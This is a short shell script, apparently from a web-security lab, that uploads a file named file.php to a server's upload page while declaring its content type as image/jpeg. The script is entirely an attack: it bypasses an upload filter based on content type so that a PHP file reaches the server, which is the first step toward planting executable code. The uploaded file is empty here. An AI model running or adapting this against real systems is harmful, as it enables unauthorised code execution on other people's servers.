#!/bin/sh

touch /tmp/file.php
curl "http://${SERVER_IP}/?page=upload" -X POST -F "Upload=Upload" -F "uploaded=@/tmp/file.php;type=image/jpeg"